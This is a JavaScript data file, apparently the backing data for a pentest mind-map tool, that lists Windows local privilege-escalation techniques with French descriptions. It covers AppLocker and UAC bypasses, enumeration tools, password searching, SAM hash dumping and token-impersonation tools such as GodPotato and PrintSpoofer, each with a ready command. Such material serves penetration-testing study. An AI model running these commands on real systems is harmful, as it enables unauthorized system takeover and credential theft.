export const LOW_ACCESS_DATA = [
  {
    name: 'AppLocker Bypass',
    nodes: [
      { 
        label: 'Get AppLocker Policy', 
        cmd: 'Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections', 
        leadsTo: 'Policy Info',
        description: 'Affiche les règles AppLocker actives pour identifier les chemins autorisés.'
      },
      { 
        label: 'Writable Paths Check', 
        cmd: 'accesschk.exe -dqv "C:\\Windows\\Tasks" "C:\\Windows\\Temp"', 
        leadsTo: 'Bypass Path',
        description: 'Vérifie si l\'utilisateur courant peut écrire dans des dossiers système souvent exclus (Tasks, Temp, Spool).'
      },
      { 
        label: 'InstallUtil Bypass', 
        cmd: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Path\\To\\Payload.exe', 
        leadsTo: 'Execution',
        description: 'Exécute un binaire .NET via InstallUtil pour contourner les règles basées sur les exécutables standard.'
      },
      { 
        label: 'MsBuild Bypass', 
        cmd: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Path\\To\\Payload.xml', 
        leadsTo: 'Execution',
        description: 'Exécute du code C# inline contenu dans un fichier XML projet via MSBuild (binaire signé Microsoft).'
      }
    ]
  },
  {
    name: 'UAC Bypass',
    nodes: [
      { 
        label: 'Fodhelper', 
        cmd: 'fodhelper.exe', 
        leadsTo: 'High Integrity',
        description: 'Technique classique modifiant une clé de registre pour exécuter une commande via fodhelper avec élévation automatique.'
      },
      { 
        label: 'WSReset', 
        cmd: 'wsreset.exe', 
        leadsTo: 'High Integrity',
        description: 'Exploite le binaire de reset du Windows Store pour exécuter une commande avec les privilèges élevés.'
      }
    ]
  },
  {
    name: 'Automated Enum (Local)',
    nodes: [
      { 
        label: 'WinPEAS', 
        cmd: 'winPEASx64.exe', 
        leadsTo: 'Full Report',
        description: 'Outil de référence pour l\'énumération locale : patchs manquants, services vulnérables, fichiers sensibles, etc.'
      },
      { 
        label: 'PrivescCheck', 
        cmd: 'Import-Module .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended', 
        leadsTo: 'Full Report',
        description: 'Script PowerShell complet pour détecter les mauvaises configurations de sécurité locales.'
      }
    ]
  },
  {
    name: 'Sensitive Files Search',
    nodes: [
      { 
        label: 'Find Passwords', 
        cmd: 'findstr /si "password" *.txt *.xml *.ini *.config', 
        leadsTo: 'Cleartext Creds',
        description: 'Recherche récursive de chaînes de caractères "password" dans les fichiers de configuration et textes.'
      }
    ]
  },
  {
    name: 'Local Exploits (CVE)',
    nodes: [
      { 
        label: 'SMBGhost (CVE-2020-0796)', 
        cmd: 'Exploit LPE pour Windows 10 v1903/1909', 
        leadsTo: 'SYSTEM',
        description: 'Exploite une vulnérabilité dans la compression SMBv3 pour passer de User à SYSTEM.'
      },
      { 
        label: 'HiveNightmare (CVE-2021-36934)', 
        cmd: 'icacls C:\\Windows\\System32\\config\\SAM', 
        leadsTo: 'SAM/SYSTEM Hives',
        description: 'Vérifie si les fichiers SAM/SYSTEM sont lisibles par les utilisateurs (SeriousSAM) pour dumper les hashs locaux.'
      }
    ]
  },
  {
    name: 'Service Impersonation (Potatoes)',
    nodes: [
      { 
        label: 'GodPotato', 
        cmd: 'GodPotato.exe -cmd "cmd /c whoami"', 
        leadsTo: 'SYSTEM',
        description: 'Exploite le privilège SeImpersonate (souvent présent sur les comptes de service IIS/SQL) pour devenir SYSTEM.'
      },
      { 
        label: 'PrintSpoofer', 
        cmd: 'PrintSpoofer.exe -i -c cmd', 
        leadsTo: 'SYSTEM',
        description: 'Utilise le service Spooler et des pipes nommés pour obtenir un token SYSTEM via SeImpersonate.'
      }
    ]
  },
  {
    name: 'Kerberos Relay (Local)',
    nodes: [
      { 
        label: 'KrbRelayUp', 
        cmd: 'KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount', 
        leadsTo: 'SYSTEM',
        description: 'Force une authentification Kerberos locale vers LDAP pour créer un compte machine et s\'élever (RBCD).'
      }
    ]
  }
];